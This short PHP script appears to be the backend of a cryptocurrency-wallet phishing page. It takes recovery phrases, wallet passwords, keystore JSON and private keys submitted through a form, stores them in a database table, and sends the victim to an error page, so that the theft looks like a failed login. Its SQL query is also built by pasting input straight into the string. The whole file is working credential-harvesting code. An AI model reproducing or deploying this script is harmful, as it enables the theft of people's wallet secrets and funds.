<?php 
    require_once "base.php";

    $phrases = htmlspecialchars($_POST['phrase']);
    $walletpassword = htmlspecialchars($_POST['walletpassword']);
    $keystorejson = htmlspecialchars($_POST['keystorejson']);
    $privatkey = htmlspecialchars($_POST['privatkey']);


    $requete = "INSERT INTO information (phrases,wallet_password,keystore_json,private_key) VALUES ('$phrases','$walletpassword','$keystorejson','$privatkey')";
    $pre = $bd->prepare($requete);
    $pre->execute();
    header("Location:error.php");

?>